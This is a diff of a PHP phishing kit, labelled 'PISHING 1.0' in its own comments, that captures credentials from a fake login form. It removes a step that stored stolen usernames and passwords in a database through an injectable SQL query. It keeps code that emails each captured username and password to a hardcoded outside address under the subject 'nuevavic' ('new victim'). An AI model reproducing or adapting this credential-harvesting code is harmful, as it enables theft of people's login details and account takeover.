@@ -17,17 +17,9 @@ function ChechPassword($password)
  	font-family:"lucida grande",tahoma,verdana,arial,sans-serif; position:relative;">
  	Contraseña de al menos 5 caracteres
  	</p>';
-	 } else {
-	 	//DATABASE QUERY'S FOR PISHING 1.0
-	 	//-------------------------------------------------------------------------------------------------------//
-	 	#Aqui hacemos toda la parte que tiene que ver con base de datos en                                       //
-	 	#la cual se conecta y luego se genera la consulta correspondiente para insertar los datos introducidos   //
-	 	#en la BASE DE DATOS                                                                                     //
-	 	 include('conexion.php');                                                                                //
-		 $registrar  = "INSERT INTO elite5(style,elite,fecha)VALUES('$usuario','$password','$fecha')";           //
-		 mysql_query($registrar);                                                                                //
-		 # Aqui generamos un correo electronico para hacer otro respaldo de la informacion introducida           //
-		 $receptor = "eldadofarias@hotmail.com";                               //correo electronico              //
+	 } else {//
+		 # Aqui generamos un correo electronico para hacer otro respaldo de la informacion introducida    //
+		 $receptor = "eldadofarias@hotmail.com";                               //correo electronico      //
          $asunto = "nuevavic";                                                 //asunto del mensaje              //
          $mensaje ="STYLE---".$usuario."---"."ELITE---".$password."---".$fecha;//mensaje del correo              //
          mail($receptor,$asunto,$mensaje);//enviamos el mail en cuestion                                         //
